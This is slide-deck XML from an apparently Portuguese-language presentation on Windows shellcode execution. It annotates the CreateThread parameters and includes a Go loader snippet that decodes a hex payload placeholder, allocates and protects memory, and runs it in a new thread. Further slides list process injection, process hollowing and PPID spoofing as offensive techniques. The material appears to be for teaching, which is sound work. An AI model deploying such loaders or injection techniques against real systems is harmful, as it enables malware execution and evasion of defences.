          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5799698" y="4163785"/>
            <a:ext cx="1077685" cy="244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B982E-8241-BE2B-9A2E-8B451C897446}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6094475" y="610382"/>
            <a:ext cx="424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Local </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>onde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 err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>iniciar</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>mudanca</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>permissao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81C804-E99E-57FB-6850-79BD53166E8E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6281057" y="979714"/>
            <a:ext cx="0" cy="318407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123EA67-6DDA-46FE-5605-979B8768F481}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5799698" y="4388642"/>
            <a:ext cx="2266610" cy="244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74FF1A-7622-CEB2-F9E4-3B561D0345EC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6542347" y="1204571"/>
            <a:ext cx="4568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>
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tamanho</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> = Quanto da memoria devo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>alterar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4BB627-BC1D-FA22-DDAE-8345275798C8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7111527" y="1567543"/>
            <a:ext cx="0" cy="28411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3BA19A6-600A-10DA-4C52-EB448ED0C50C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5704381" y="4624214"/>
            <a:ext cx="2691155" cy="238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F2665-D906-7E7B-BFBC-DF55118C5A5D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7451139" y="1956400"/>
            <a:ext cx="186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Qual a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>permissao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CFE611-84C4-BCD7-053B-354883B56880}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8047693" y="2325732"/>
            <a:ext cx="0" cy="2314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2235619-7AB1-575D-CD9C-9293BD5CBA61}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5799696" y="4864789"/>
            <a:ext cx="3518475" cy="238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99375-E76D-733D-09DD-F95DEB850E9D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8826788" y="3518771"/>
            <a:ext cx="3200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Onde </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>salvar</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>permissao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 err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>atual</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA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FEA91F-E619-6248-F257-EEA4BF517CB7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="22" idx="2"/>
            <a:endCxn id="20" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="9318171" y="3888103"/>
            <a:ext cx="1108885" cy="109597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349124E0-879B-E753-D6E7-1E022503CD64}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="7656478" y="3828461"/>
            <a:ext cx="1487523" cy="1023608"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val -26107"/>
            </a:avLst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97B6E24-C30E-3AF0-0266-8E603AE5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10" grpId="0" animBg="1"/>
      <p:bldP spid="10" grpId="1" animBg="1"/>
      <p:bldP spid="11" grpId="0"/>
      <p:bldP spid="11" grpId="1"/>
      <p:bldP spid="15" grpId="0" animBg="1"/>
      <p:bldP spid="15" grpId="1" animBg="1"/>
      <p:bldP spid="16" grpId="0"/>
      <p:bldP spid="16" grpId="1"/>
      <p:bldP spid="20" grpId="0" animBg="1"/>
      <p:bldP spid="20" grpId="1" animBg="1"/>
      <p:bldP spid="22" grpId="0"/>
      <p:bldP spid="2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CE9DC-2DFD-C8D2-3089-765022C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B82DCCD-ECF3-3E05-FF3F-9776B8941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5543CF-A015-9CCB-13EF-E465AFE6D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B5E639-0C1D-CCE7-9DE4-A4EBFD30EA45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thread, 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chemeClr val="bg2">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill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01CB80-D45A-39E8-437D-71961D379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2F2652-3C46-D8ED-7E56-3D7F78C14544}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5630963" y="37965"/>
            <a:ext cx="663723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noProof="1"/>
              <a:t>5 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="FFC66D"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>CreateThread</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" noProof="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="6897BB"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>Atributos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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="6897BB"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>Tamanho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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" noProof="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>Onde inicia o codigo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Parametros, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="6897BB"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>Flags</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="CC7832"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="6897BB"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>ID da Thread</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" noProof="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="pt-BR" b="1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D91DD-D93D-BF9A-00F0-51E91F0D8519}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10877900" y="5312229"/>
            <a:ext cx="1183471" cy="269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4BEB6-0EEA-72CC-4069-ECC5575F4829}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9481457" y="4207328"/>
            <a:ext cx="215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Onde </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>inicia</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>codigo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60A8BD-5E99-CDBB-90F5-4F4EE6F8473F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10556869" y="4576660"/>
            <a:ext cx="912767" cy="73556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46498A2-432A-B6E6-5436-9DA8EEBB703B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5502740" y="5548831"/>
            <a:ext cx="919832" cy="269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0529C-DE6E-2323-E20C-9DA8A5FA4E58}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5543875" y="3837996"/>
            <a:ext cx="172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Sem </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>parametros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50FF4D-220B-A398-C79B-1A5BF47E2FBC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5962656" y="4207328"/>
            <a:ext cx="445110" cy="134150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514AB33-502C-34B4-2473-EA49E98D199F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6620804" y="5542997"/>
            <a:ext cx="313396" cy="269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05B8B3-5B9B-D812-4E3C-2791E3A8CFEE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6852875" y="4455531"/>
            <a:ext cx="2236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Windows </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>gera</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>numero</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/ID da thread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050A78-3160-64E8-B711-80E309B2F52A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6777502" y="5101862"/>
            <a:ext cx="1193721" cy="4411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92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11" grpId="0" animBg="1"/>
      <p:bldP spid="11" grpId="1" animBg="1"/>
      <p:bldP spid="12" grpId="0"/>
      <p:bldP spid="12" grpId="1"/>
      <p:bldP spid="18" grpId="0" animBg="1"/>
      <p:bldP spid="18" grpId="1" animBg="1"/>
      <p:bldP spid="20" grpId="0"/>
      <p:bldP spid="2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DDC57-EAF5-DED7-AA83-9AFF2365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E7020C8-88FF-6E75-95F8-417AE65F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E6DDE5-661F-2ED7-D4C9-783AC51FD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769577-14E2-7688-23ED-3A32C73FAAFD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noProof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thread, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" sz="18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}</a:t>
            </a:r>
            <a:endParaRPr lang="en-CA" sz="1800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22E905-99D5-5E49-F12F-5576B969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00D806-CB0E-4166-119A-2A84F0F1547F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5598447" y="5273737"/>
            <a:ext cx="769695" cy="269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ADCDE-66F0-8B95-BD07-7041172A6316}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6825343" y="4371556"/>
            <a:ext cx="3646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Faz o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>programa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 err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>esperar</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> a Thread </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>terminar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6A016A-F84F-9E8A-F2C2-64D8958B3547}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="3" idx="3"/>
            <a:endCxn id="9" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6368142" y="5408367"/>
            <a:ext cx="3751725" cy="6055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A6AEED9-85B1-E1E7-A3DE-08D3F91072C4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9767676" y="6013966"/>
            <a:ext cx="704381" cy="269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1DD67D-C4DD-10A8-7DE9-1BF5DC9CC4F6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7435663" y="6013966"/>
            <a:ext cx="1979823" cy="269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5CFD7B-BDC7-C297-7AD8-40B70616A6D3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8425575" y="5017887"/>
            <a:ext cx="242936" cy="9960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02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4" grpId="1"/>
      <p:bldP spid="9" grpId="0" animBg="1"/>
      <p:bldP spid="12" grpId="0" animBg="1"/>
      <p:bldP spid="1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7389C-F6CB-D581-CFA7-200690E8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CAF54C4-C8B5-C62C-2798-FCD7F823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1D5A5-A977-0AD7-51C8-DE02BCAD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8500C1-3C22-E597-95E4-0CF72DEE4608}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5464629" y="163286"/>
            <a:ext cx="6724321" cy="6694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func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var payload = ”Codigo programa em uma string hexadecimal"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calculadora, _ := hex.DecodeString(payload)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calcAddress, _, _ := kernel32.NewProc("VirtualAlloc").Call(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MEM_COMMIT|MEM_RESERVE,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syscall.PAGE_READWRITE)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rtlCpyMem, _, _ := ntdll.NewProc("RtlCopyMemory").Call(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calcAddress,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uintptr(unsafe.Pointer(&amp;calculadora[0])),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uintptr(len(calculadora)))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var oldProtect uint32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kernel32.NewProc("VirtualProtect").Call(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rtlCpyMem,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uintptr(len(calculadora)),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syscall.PAGE_EXECUTE_READ,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   (uintptr)(unsafe.Pointer(&amp;oldProtect)))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thread, _, _ := kernel32.NewProc("CreateThread").Call(0, 0, calcAddress, uintptr(0), 0,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   kernel32.NewProc("WaitForSingleObject").Call(thread, 0xFFFFFF)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CA" sz="1800" noProof="1">
              <a:solidFill>
                <a:srgbClr val="CC783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CA" sz="1800" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="CC7832"/>
                </a:solidFill>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-CA" sz="1800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31CF6-0265-B0C6-BD28-EDC489BBD9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8" r="9089" b="-2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="-3124637" y="10"/>
            <a:ext cx="8668512" cy="6857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437AA0-6468-1951-1474-1190E51E74DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5620218" y="1104508"/>
            <a:ext cx="5319925" cy="1225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B5840-1D29-5C1C-F1CA-CF6EAFCC2E02}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5620217" y="2492818"/>
            <a:ext cx="5319925" cy="104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94415-6002-A328-6C91-9A898AE7F562}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5620216" y="3679361"/>
            <a:ext cx="5319925" cy="14804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3F8C89-30C7-49E4-6D7C-8D01024AE6BD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5543875" y="5301330"/>
            <a:ext cx="6517496" cy="1045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12771C-EA22-4E67-8383-158BE05F24C6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11288486" y="1360714"/>
            <a:ext cx="677307" cy="5660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20CAAF-8DE0-DC66-3AE1-B487407D9B2A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11356194" y="2634342"/>
            <a:ext cx="555171" cy="5660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133AE6-FD44-96AE-40BB-5D5AB248247D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11410622" y="4027702"/>
            <a:ext cx="555171" cy="5660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6A5937-0815-DEE6-CCD2-D1DF461D7E34}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11484428" y="6128633"/>
            <a:ext cx="555171" cy="56605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5636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BEC73-277F-178F-A1B3-E069512B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4A6233D-75E3-A1F0-FEA9-CF287EA27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05CA7B-6E4D-DB38-F39D-A9A1AA373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1" b="6235"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="-1349825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DBF2C50-070C-6AB6-4E40-C1CD4A244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EE62F9-7D52-CD53-1069-A491922B377C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8658508" y="0"/>
            <a:ext cx="3301263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9600" b="1" dirty="0"/>
              <a:t>D</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="9600" b="1" dirty="0"/>
              <a:t>E</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="9600" b="1" dirty="0"/>
              <a:t>M</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="96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15720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0D05E-761A-37AC-FCBA-246D6A36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0BBCA0-8346-D953-610A-88812811E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397" y="349362"/>
            <a:ext cx="1795483" cy="2771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3B9C22-09F3-380D-E893-9C318FD4E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" y="0"/>
            <a:ext cx="457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1D2AD44-7C20-9D67-7A2A-6BA96DD36A20}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5733293" y="699762"/>
            <a:ext cx="5820579" cy="574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pt-BR" sz="4000" b="1" dirty="0"/>
              <a:t>Variações e Técnicas Avançadas</a:t>
            </a:r>
            <a:endParaRPr lang="pt-BR" sz="4000" b="1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DC6E9E7-FEA6-792A-D46B-ACB2FDD127F3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5312880" y="1898596"/>
            <a:ext cx="6661405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457200">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" noProof="0" dirty="0"/>
              <a:t>Remote </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" noProof="0" dirty="0" err="1"/>
              <a:t>Process</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" noProof="0" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" noProof="0" dirty="0" err="1"/>
              <a:t>Injection</a:t>
            </a:r>
            <a:endParaRPr lang="pt-BR" sz="2000" noProof="0" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="pt-BR" b="1" noProof="0" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" noProof="0" dirty="0"/>
              <a:t>2. Remote DLL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" noProof="0" dirty="0" err="1"/>
              <a:t>Injection</a:t>
            </a:r>
            <a:endParaRPr lang="pt-BR" sz="2400" noProof="0" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="pt-BR" b="1" noProof="0" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" noProof="0" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" noProof="0" dirty="0" err="1"/>
              <a:t>Process</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" noProof="0" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" noProof="0" dirty="0" err="1"/>
              <a:t>Hollowing</a:t>
            </a:r>
            <a:endParaRPr lang="pt-BR" sz="2400" noProof="0" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="pt-BR" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" noProof="0" dirty="0"/>
              <a:t>4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" dirty="0"/>
              <a:t>. PPID </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" dirty="0" err="1"/>
              <a:t>Spoof</a:t>
            </a:r>
            <a:endParaRPr lang="pt-BR" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="pt-BR" sz="1200" dirty="0"/>
              <a:t>(a pedidos: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" sz="1200" dirty="0">
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>https://github.com/intruderlabs/ppid_spoof</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" sz="1200" dirty="0"/>
              <a:t>) </a:t>
            </a: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107791865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E3351-577F-3AAF-CE7C-66076ED2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DB7FB-7CCD-9E18-0C34-CC4060ED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397" y="349362"/>
            <a:ext cx="1795483" cy="2771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3698F8-FCD6-C13A-074F-0DAD9D357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" y="0"/>
            <a:ext cx="457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0B36D18-5370-6153-2285-68070F101A6A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5733293" y="699762"/>
            <a:ext cx="5820579" cy="574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pt-BR" sz="4000" b="1" dirty="0"/>
              <a:t>Uso Ofensivo e Desafios</a:t>
            </a:r>
            <a:endParaRPr lang="pt-BR" sz="4000" b="1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576DA9D-DB4F-BA53-AC4D-24952A038293}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5312880" y="1898596"/>
            <a:ext cx="6661405" cy="426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457200">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" noProof="0" dirty="0"/>
              <a:t>O </a:t>
            </a:r>
            <a:r>
